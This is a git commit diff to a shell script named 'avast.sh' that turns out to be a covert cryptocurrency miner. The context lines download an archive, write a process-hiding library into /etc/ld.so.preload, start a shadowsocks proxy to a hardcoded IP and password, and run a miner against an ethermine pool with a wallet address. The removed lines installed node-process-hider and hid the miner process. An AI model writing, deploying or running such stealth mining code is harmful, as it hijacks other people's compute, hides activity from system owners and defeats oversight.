2c35731eabc8f28e129197031030cc9a6914a916
renilo <88342640+renilo@users.noreply.github.com>
2022-04-06 02:39:40 +0700

    Update avast.sh

--- avast.sh
+++ avast.sh
@@ -6,11 +6,6 @@ apt update;apt -y install binutils cmake build-essential screen unzip net-tools 
 
 apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-
-npm i -g node-process-hider
-
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
@@ -56,7 +51,5 @@ echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 52.203.46.122 -p 8388 -l 9999 -k Elibawnos -m chacha20-ietf-poly1305 -v &
-
-ph add bezzHash
 
 ./graftcp/graftcp ./bezzHash --url=0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.$(echo $(shuf -i 1-9999999 -n 1)-WEWEK)@us1.ethermine.org:4444
